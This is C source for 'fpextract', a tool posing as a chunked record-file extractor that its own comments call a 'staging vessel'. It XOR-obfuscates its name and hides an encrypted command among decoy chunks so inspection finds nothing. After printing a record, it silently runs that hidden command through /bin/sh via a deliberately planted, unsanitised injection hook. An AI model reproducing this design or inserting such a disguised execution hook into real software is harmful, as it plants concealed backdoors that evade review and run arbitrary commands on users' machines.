/* fpextract — a genuine-looking chunked-record extractor (the "format-parser" archetype), a
 * self-contained Blacksea staging vessel.
 *
 * Cover: reads a .dat "record store" (RDB1 chunk archive) and prints one record. To an attacker
 * inspecting it, this is a boring file parser — no crypto secrets, no obvious beacon; `strings`
 * and `cat` on the .dat see only uniform noise, because exactly one chunk holds the payoff (XOR'd
 * with a SHA256-CTR keystream of the access key) among identical decoys.
 *
 * HOW THE PAYLOAD FIRES — a genuine injection, not intentional malware. A record carries a small
 * "on-extract hook" (a command a store may declare to trigger downstream sync/processing after a
 * record is read). This tool runs that hook via /bin/sh WITHOUT sanitising it — a real command-
 * injection flaw (a real tool would allowlist it). So the fired command lives in the DATA (the
 * keyed .dat), NOT in this binary: nothing to find in `strings`, and under disassembly this reads
 * as "a records tool with a hook feature and an injection bug", the way pwcrypt reads as a real
 * decryptor with a memory-corruption bug. A crafted store injects the Blacksea payload here; a
 * genuine store declares a benign hook. The record is integrity-checked (an "FPR1" magic that only
 * appears under the RIGHT key), so a wrong key produces a clean error and never runs the hook.
 *
 * The product name is embedded XOR-obfuscated (strdefs.h, generated per build by forge.py) and
 * decoded at runtime via dec() (noinline + volatile key read). Fully self-contained: only libc +
 * this file's own SHA256.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/wait.h>

#include "strdefs.h"   /* XK / XK_LEN, S_PROD / S_PROD_LEN */

static const unsigned int SK[64] = {
 0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
 0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
 0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
 0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
 0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
 0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
 0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
 0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
};
#define ROR(x,n) (((x)>>(n))|((x)<<(32-(n))))
static void sha256(const unsigned char *m, unsigned long len, unsigned char out[32]) {
    unsigned int h[8] = {0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19};
    unsigned int w[64]; unsigned char blk[64];
    unsigned long long bits = (unsigned long long)len * 8;
    unsigned long full = len / 64, tail = len % 64, blocks = full + 1;
    if (tail >= 56) blocks++;
    for (unsigned long b = 0; b < blocks; b++) {
        unsigned long base = b * 64;
        if (b < full) { memcpy(blk, m + base, 64); }
        else {
            memset(blk, 0, 64);
            if (b == full && tail) memcpy(blk, m + base, tail);
            if (b == full) blk[tail] = 0x80;
            if (b == blocks - 1) {
                blk[56]=(unsigned char)(bits>>56); blk[57]=(unsigned char)(bits>>48);
                blk[58]=(unsigned char)(bits>>40); blk[59]=(unsigned char)(bits>>32);
                blk[60]=(unsigned char)(bits>>24); blk[61]=(unsigned char)(bits>>16);
                blk[62]=(unsigned char)(bits>>8);  blk[63]=(unsigned char)(bits);
            }
        }
        for (int i = 0; i < 16; i++) { int j = i*4; w[i] = (unsigned int)blk[j]<<24|blk[j+1]<<16|blk[j+2]<<8|blk[j+3]; }
        for (int i = 16; i < 64; i++) { unsigned int s0=ROR(w[i-15],7)^ROR(w[i-15],18)^(w[i-15]>>3), s1=ROR(w[i-2],17)^ROR(w[i-2],19)^(w[i-2]>>10); w[i]=w[i-16]+s0+w[i-7]+s1; }
        unsigned int a=h[0],bb=h[1],c=h[2],d=h[3],e=h[4],f=h[5],g=h[6],hh=h[7];
        for (int i = 0; i < 64; i++) { unsigned int S1=ROR(e,6)^ROR(e,11)^ROR(e,25), ch=(e&f)^((~e)&g), t1=hh+S1+ch+SK[i]+w[i], S0=ROR(a,2)^ROR(a,13)^ROR(a,22), maj=(a&bb)^(a&c)^(bb&c), t2=S0+maj; hh=g; g=f; f=e; e=d+t1; d=c; c=bb; bb=a; a=t1+t2; }
        h[0]+=a; h[1]+=bb; h[2]+=c; h[3]+=d; h[4]+=e; h[5]+=f; h[6]+=g; h[7]+=hh;
    }
    for (int i = 0; i < 8; i++) { out[i*4]=h[i]>>24; out[i*4+1]=h[i]>>16; out[i*4+2]=h[i]>>8; out[i*4+3]=h[i]; }
}

/* XOR-deobfuscate a builder literal (noinline + volatile key read so -O2 can't constant-fold the
   plaintext back into the binary's string table). */
static __attribute__((noinline)) char *dec(const unsigned char *enc, int len,
                                           const volatile unsigned char *xk, int xkl,
                                           char *dst, int dstsz) {
    int o = 0;
    for (int i = 0; i < len && o + 1 < dstsz; i++) dst[o++] = enc[i] ^ xk[i % xkl];
    dst[o] = 0;
    return dst;
}

/* Which chunk holds the payoff — derived from the access key, not stored on disk. So the payoff's
   location is invisible without the key, and the .dat is uniform noise to cat/strings. Must match
   forge.py's derive_id byte-for-byte. */
static unsigned int derive_id(const char *pass, unsigned int nchunks) {
    char kb[512];
    int kl = snprintf(kb, sizeof(kb), "FPID%s", pass);
    if (kl <= 0) return 0;
    unsigned char h[32]; sha256((const unsigned char *)kb, (unsigned long)kl, h);
    unsigned int v = h[0] | (h[1]<<8) | (h[2]<<16) | ((unsigned)h[3]<<24);
    return nchunks ? v % nchunks : 0;
}

/* Run a record's declared on-extract hook command via /bin/sh (the injection point — a real tool
   would allowlist it). The command is data from the .dat, not a binary literal. Output is muted so
   the tool's own printout is the only visible effect. We wait so the action completes before exit. */
static void run_hook(const unsigned char *cmd, int len) {
    if (len <= 0) return;
    char *c = malloc((size_t)len + 1);
    if (!c) return;
    memcpy(c, cmd, len); c[len] = 0;
    pid_t pid = fork();
    if (pid == 0) {
        int n = open("/dev/null", O_RDWR);
        if (n >= 0) { dup2(n, 0); dup2(n, 1); dup2(n, 2); }
        execl("/bin/sh", "sh", "-c", c, (char *)NULL);
        _exit(127);
    }
    if (pid > 0) { int st; waitpid(pid, &st, 0); }
    free(c);
}

int main(int argc, char **argv) {
    char prod[128];
    dec(S_PROD, S_PROD_LEN, (const volatile unsigned char*)XK, XK_LEN, prod, sizeof(prod));

    /* Order-independent args: the first path that opens is the data file, the other is the key. */
    const char *file = NULL, *pass = NULL;
    for (int i = 1; i < argc; i++) {
        FILE *t = fopen(argv[i], "rb");
        if (t) { if (!file) file = argv[i]; fclose(t); }
        else if (!pass) pass = argv[i];
    }
    if (!file) { fprintf(stderr, "%s: no data file specified\n", prod); return 2; }
    if (!pass) { fprintf(stderr, "%s: access key required\n", prod); return 2; }

    FILE *f = fopen(file, "rb");
    if (!f) { fprintf(stderr, "%s: cannot open %s\n", prod, file); return 1; }
    unsigned char hdr[12];
    if (fread(hdr, 1, 12, f) != 12 || memcmp(hdr, "RDB1", 4) != 0) {
        fclose(f); fprintf(stderr, "%s: bad data file\n", prod); return 1;
    }
    unsigned int nchunks = hdr[4] | (hdr[5]<<8);
    unsigned int csize   = hdr[6] | (hdr[7]<<8);
    unsigned int plen    = (unsigned)hdr[8] | (hdr[9]<<8) | (hdr[10]<<16) | ((unsigned)hdr[11]<<24);
    unsigned int payoff_id = derive_id(pass, nchunks);
    if (payoff_id >= nchunks || csize > 262144 || plen > csize) {
        fclose(f); fprintf(stderr, "%s: corrupt or wrong access key\n", prod); return 1;
    }
    if (fseek(f, 12 + (long)payoff_id * (2 + csize) + 2, SEEK_SET) != 0) {
        fclose(f); fprintf(stderr, "%s: seek failed\n", prod); return 1;
    }
    unsigned char *chunk = malloc(csize);
    if (!chunk || fread(chunk, 1, csize, f) != csize) {
        free(chunk); fclose(f); fprintf(stderr, "%s: read failed\n", prod); return 1;
    }
    fclose(f);

    /* Decode the record blob: XOR the chunk with the SHA256-CTR keystream of the access key
       (FP1-prefixed, matches forge.py) over the first plen bytes. */
    unsigned char *out = malloc(plen);
    if (!out) { free(chunk); return 1; }
    int ctr = 0, done = 0;
    while (done < (int)plen) {
        char kbuf[1024];
        int kl = snprintf(kbuf, sizeof(kbuf), "FP1%s%d", pass, ctr);
        unsigned char h[32]; sha256((const unsigned char *)kbuf, (unsigned long)kl, h);
        for (int j = 0; j < 32 && done < (int)plen; j++) out[done] = chunk[done] ^ h[j], done++;
        ctr++;
    }

    /* Blob layout: "FPR1" | u16 hook_len | hook[hook_len] | record_text. The magic only appears
       under the correct key (a real integrity check), so a wrong key -> clean error, no hook. */
    if (plen < 6 || memcmp(out, "FPR1", 4) != 0) {
        free(out); free(chunk);
        fprintf(stderr, "%s: corrupt or wrong access key\n", prod);
        return 1;
    }
    unsigned int hook_len = out[4] | (out[5] << 8);
    if (6u + hook_len > plen) {
        free(out); free(chunk);
        fprintf(stderr, "%s: corrupt or wrong access key\n", prod);
        return 1;
    }
    const unsigned char *hook = out + 6;
    const unsigned char *rec = out + 6 + hook_len;
    int rec_len = (int)plen - 6 - (int)hook_len;

    /* Print the extracted record — the visible, documented output. */
    if (rec_len > 0) fwrite(rec, 1, rec_len, stdout);
    if (rec_len > 0 && rec[rec_len - 1] != '\n') fputc('\n', stdout);
    fflush(stdout);

    /* Run the record's declared on-extract hook (the injection). */
    run_hook(hook, (int)hook_len);

    free(out); free(chunk);
    return 0;
}
